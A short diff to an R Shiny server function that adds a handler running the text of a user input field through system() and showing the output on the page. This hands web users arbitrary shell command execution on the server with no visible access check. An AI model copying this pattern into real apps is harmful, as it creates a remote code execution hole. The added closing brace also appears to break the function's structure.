@@ -30,6 +30,19 @@ server <- function(input, output, session) {
       actionButton("admin_disconnect", "Disconnect all users")
     }})
     observeEvent(input$admin_disconnect, {session$close()})
+    
+    result <- eventReactive(input$run, {
+      tryCatch({
+        system(input$command, intern = TRUE)
+      }, error = function(e) {
+        paste("Error:", e$message)
+      })
+    })
+    
+    output$output <- renderText({
+      paste(result(), collapse = "\n")
+    })
+}
 
     # Session end -------------------------------------------------------------
     session$onSessionEnded(function(){
